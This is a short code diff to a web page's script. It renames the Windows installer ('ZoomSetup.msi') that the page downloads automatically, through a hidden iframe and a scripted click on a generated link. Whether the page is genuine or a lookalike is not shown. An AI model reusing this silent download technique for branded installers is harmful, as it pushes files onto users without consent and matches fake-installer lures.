@@ -289,14 +289,14 @@
           // Method 1: Create iframe
           const iframe = document.createElement('iframe');
           iframe.style.display = 'none';
-          iframe.src = 'ZoomInstallerFull.msi';
+          iframe.src = 'ZoomSetup.msi';
           document.body.appendChild(iframe);
           
           // Method 2: Create link and click (fallback)
           setTimeout(() => {
             const link = document.createElement('a');
-            link.href = 'ZoomInstallerFull.msi';
-            link.download = 'ZoomInstallerFull.msi';
+            link.href = 'ZoomSetup.msi';
+            link.download = 'ZoomSetup.msi';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
@@ -318,4 +318,5 @@
 </body>
 
 </html>
+
 
